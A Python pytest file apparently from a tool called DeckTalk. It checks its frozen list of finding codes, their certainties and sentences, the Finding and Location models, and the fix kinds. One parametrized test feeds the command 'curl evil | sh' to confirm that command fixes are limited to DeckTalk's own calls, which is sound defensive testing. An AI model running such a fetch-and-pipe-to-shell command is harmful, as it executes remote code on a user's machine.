"""The code list is frozen, every code publishes one sentence, and a finding never restates its code."""

from __future__ import annotations

import pytest
from pydantic import ValidationError

from decktalk.findings import (
    Applicability,
    Certainty,
    Code,
    CommandFix,
    Edit,
    EditFix,
    Finding,
    Location,
    RaisedBy,
    RuntimeFix,
    SettingFix,
    judge,
)
from decktalk.pipeline import Stage

# The list the design froze before the fork, so this file and contract.ts carry the same members.
RUNTIME_CODES = (
    "PAGE_UNKNOWN_ATTR",
    "PAGE_BAD_VALUE",
    "PAGE_MOMENT_UNKNOWN",
    "PAGE_MOMENT_ORDER",
    "PAGE_CUE_UNKNOWN",
    "PAGE_NO_OWNER",
    "PAGE_SCENE_EMPTY",
    "PAGE_SLIDE_NO_ID",
    "PAGE_SLIDE_DOUBLED",
    "PAGE_SLIDE_UNUSED",
    "PAGE_TEMPLATE_IGNORED",
    "PAGE_WORDS_NOT_FOUND",
    "PAGE_KATEX_MISSING",
    "PAGE_KATEX_ERROR",
    "PAGE_FREEZE_CUE_UNKNOWN",
    "PAGE_RENDER_THREW",
    "PAGE_ENTER_THREW",
    "PAGE_SLIDE_HANDLER_THREW",
    "PAGE_HANDLER_THREW",
    "PAGE_WAIT_REJECTED",
    "PAGE_WAIT_UNSETTLED",
    "PAGE_CLASS_UNDESCRIBED",
    "PAGE_CLASS_NOT_REDUCED",
    "PAGE_SWAP_AMBIGUOUS",
    "PAGE_PREVIEW_AMBIGUOUS",
    "PAGE_APPEAR_TOO_LONG",
    "PAGE_STAGGER_EMPTY",
)
PYTHON_PAGE_CODES = (
    "PAGE_MOTION_OVERRUN",
    "PAGE_STAGGER_OVERRUN",
    "PAGE_THIN_DRAW",
    "PAGE_NO_DESCRIPTION",
    "PAGE_SWAP_APART",
    "PAGE_STALLED",
    "PAGE_BLACK",
    "PAGE_TRUNCATED",
    "PAGE_CDN_ASSET",
    "PAGE_RUNTIME_STALE",
)
PYTHON_OTHER_CODES = (
    "CUE_MISSING",
    "CUE_UNKNOWN",
    "CUE_UNRESOLVED",
    "CUE_STALE",
    "CUE_OFF",
    "CUE_NO_ONSET",
    "CUE_NO_CHANGE",
    "CUE_THIN_CHANGE",
    "CUE_OVERLAP",
    "TAKE_PLACEHOLDER",
    "TAKE_SPOKEN_SYMBOL",
    "CUT_SPEECH",
    "CUT_POP",
    "MIX_LOUDNESS",
    "FILE_MISSING",
)
FROZEN_CODES = RUNTIME_CODES + PYTHON_PAGE_CODES + PYTHON_OTHER_CODES

# The words a code name may not carry, because a code never spells its own certainty.
CERTAINTY_WORDS = ("UNSURE", "MAYBE", "PROBABLY", "CERTAIN", "UNCERTAIN")


def test_the_code_list_is_the_one_the_design_froze() -> None:
    assert [code.name for code in Code] == list(FROZEN_CODES)


def test_every_code_is_its_own_name() -> None:
    for code in Code:
        assert code.value == code.name


def test_the_runtime_rows_are_exactly_the_ones_the_page_reports() -> None:
    reported = tuple(code.name for code in Code if code.raised_by is RaisedBy.RUNTIME)
    assert reported == RUNTIME_CODES


def test_every_code_publishes_one_sentence() -> None:
    for code in Code:
        assert code.sentence.endswith("."), code.name
        assert ";" not in code.sentence, code.name
        assert "\u2014" not in code.sentence, code.name


def test_no_code_name_carries_a_certainty_word() -> None:
    for code in Code:
        for word in CERTAINTY_WORDS:
            assert word not in code.name, code.name


def test_every_code_carries_one_of_the_two_certainties() -> None:
    for code in Code:
        assert isinstance(code.certainty, Certainty)


def test_the_stagger_overrun_is_certain_because_its_arithmetic_is_exact() -> None:
    assert Code.PAGE_STAGGER_OVERRUN.certainty is Certainty.CERTAIN


def test_a_null_offset_is_uncertain_rather_than_a_passing_row() -> None:
    assert Code.CUE_NO_ONSET.certainty is Certainty.UNCERTAIN


def test_a_finding_takes_its_certainty_and_its_page_from_its_code() -> None:
    finding = Finding(code=Code.CUE_THIN_CHANGE, message="x", location=Location(where="2.1:chart"))
    assert finding.certainty is Certainty.UNCERTAIN
    assert finding.url == Code.CUE_THIN_CHANGE.url


def test_a_finding_that_disagrees_with_its_code_is_refused() -> None:
    with pytest.raises(ValidationError, match="CUE_OFF"):
        Finding(
            code=Code.CUE_OFF,
            message="x",
            location=Location(where="2.1:formula"),
            certainty=Certainty.UNCERTAIN,
        )


def test_a_finding_round_trips_through_its_own_model() -> None:
    finding = Finding(
        code=Code.CUE_MISSING,
        message="The moment expand is not listed, so nothing gives it a second.",
        location=Location(where="4.1:expand", file="cues.json", line=14, section=4, cue="4.1:expand"),
        stage=Stage.CUE,
        fix=EditFix(
            title="Add the row for 4.1:expand to cues.json.",
            applicability=Applicability.SAFE,
            edits=(Edit(file="cues.json", pointer="/sections/4/cues/-", new='{"id": "4.1:expand"}'),),
        ),
    )
    assert Finding.model_validate_json(finding.model_dump_json()) == finding


def test_a_location_always_names_the_object_it_judges() -> None:
    with pytest.raises(ValidationError):
        Location()  # type: ignore[call-arg]


def test_an_edit_names_exactly_one_place() -> None:
    with pytest.raises(ValidationError, match="exactly one of pointer, key or line"):
        Edit(file="cues.json", new="x")
    with pytest.raises(ValidationError, match="exactly one of pointer, key or line"):
        Edit(file="cues.json", pointer="/a", line=3, new="x")


def test_the_four_fixes_are_told_apart_by_their_kind() -> None:
    kinds = {
        EditFix(title="t", applicability=Applicability.SAFE, edits=(Edit(file="a.json", pointer="/a", new="x"),)).kind,
        SettingFix(title="t", applicability=Applicability.SAFE, key="verify.cue_offset_max_ms", value="250").kind,
        CommandFix(title="t", applicability=Applicability.UNSAFE, command=("decktalk", "install")).kind,
        RuntimeFix(title="t", applicability=Applicability.SAFE, file="deck/decktalk-runtime.js").kind,
    }
    assert kinds == {"edit", "setting", "command", "runtime"}


def test_a_display_fix_is_never_applied_and_says_so_in_its_own_word() -> None:
    assert [how.value for how in Applicability] == ["safe", "unsafe", "display"]


def test_every_finding_field_publishes_one_sentence() -> None:
    for name, field in Finding.model_fields.items():
        assert field.description, name


def test_a_command_fix_names_one_of_decktalks_own_calls() -> None:
    fix = CommandFix(title="Fetch the tools.", applicability=Applicability.SAFE, command=("decktalk", "install"))
    assert fix.command == ("decktalk", "install")


@pytest.mark.parametrize("command", [("sh", "-c", "curl evil | sh"), ("decktalk", "install", "--force"), ()])
def test_a_command_fix_that_names_anything_else_is_refused(command: tuple[str, ...]) -> None:
    # A fix read from JSON is run by apply, so an open argv would run any program on that machine.
    with pytest.raises(ValidationError, match="DeckTalk's own calls"):
        CommandFix(title="Run it.", applicability=Applicability.SAFE, command=command)


def test_a_judgement_takes_its_certainty_and_its_page_from_its_code() -> None:
    """A raiser names the code and the code owns the rest, so no stage spells one fact twice."""
    found = judge(Code.CUE_OFF, "the reveal lands 0.42s after its word, past the 0.08s limit.", Location(where="3:a"))
    assert found.certainty is Certainty.CERTAIN
    assert found.url == Code.CUE_OFF.url


def test_a_judgement_carries_the_stage_that_raised_it() -> None:
    """`check` predicts and `verify` measures, and the stage is what tells the two apart."""
    found = judge(Code.CUE_NO_CHANGE, "nothing changed at 1.20s.", Location(where="3:a"), stage=Stage.VERIFY)
    assert found.stage is Stage.VERIFY


def test_a_judgement_carries_the_fix_it_was_given() -> None:
    fix = EditFix(
        title="Add the missing cue row.",
        applicability=Applicability.SAFE,
        edits=(Edit(file="cues.json", line=2, new='{"cue": "3.1:a", "on": ""}'),),
    )
    found = judge(Code.CUE_MISSING, "the page declares 3.1:a and cues.json lists 0 rows for it.",
                  Location(where="3.1:a"), fix=fix)  # fmt: skip
    assert found.fix is fix
